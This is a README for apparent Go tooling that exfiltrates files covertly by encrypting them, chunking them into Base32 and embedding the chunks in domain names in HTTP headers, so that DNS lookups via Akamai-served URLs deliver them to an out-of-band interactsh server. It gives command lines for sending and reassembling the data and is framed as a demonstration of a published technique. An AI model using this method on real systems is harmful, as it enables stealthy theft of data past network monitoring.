#Data-Bouncer

I came across this Proof of Concept outlined here in https://thecontractor.io/data-bouncing.
I took their ideas and wrote two Go scripts that can be used for demonstration purposes.

One that encrypts and bounces the data you want to exfiltrate and the other that reassembles and decrypts it.

You will need an OOB dns server under you're control for this to work and collect the data. Here I'm using https://github.com/projectdiscovery/interactsh

From my testing this should work on any url that touches Akamai.

###Bounce.go
This script reads your chosen domain names from domains.txt, first encrypts your chosen file using a password you provided, encodes the file into Base32 and finally splits it into 63 byte chunks and sends them as part of a domain name in an HTTP header.

Example:
```
go run bounce.go -f <filename.txt> -p <password> -u <UUID> -e <interact server url> -v
```

###Regenerate.go
This script reads the JSON output from your interactsh server, processes and reassembles the chunks and does the reverse by decoding, decrypting, and finally outputting the file.

Example:
```
go run regenerate.go -i <exported.json> -o <outputfile.txt> -p <password> -u <UUID> -v
```
